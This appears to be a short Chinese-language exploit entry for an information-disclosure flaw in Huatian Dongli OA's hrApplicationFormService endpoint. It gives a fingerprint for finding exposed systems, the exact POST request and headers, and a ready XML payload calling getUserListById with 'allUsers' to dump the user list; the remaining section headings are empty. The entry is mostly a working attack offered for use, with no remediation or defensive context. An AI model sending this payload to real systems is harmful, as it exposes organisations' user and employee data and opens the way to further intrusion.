# 华天动力OAhrApplicationFormService存在信息泄露漏洞

- **系统**：华天动力　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`app.name="华天软件 OA"`
- **请求**：`POST /OAapp/bfapp/buffalo/hrApplicationFormService HTTP/1.1`
- **关键头**：`Content-Type: text/xml;charset=utf-8`　`Content-Length: 288`

**请求体 / payload**
```
<buffalo-call>
<method>getUserListById</method>
<boolean>0</boolean>
<string></string>
<string>allUsers</string>
<string></string>
<string></string>
<boolean>0</boolean>
<boolean>1</boolean>
</buffalo-call>
```

**其他**
- 华天动力OA hrApplicationFormService存在信息泄露漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 华天动力OA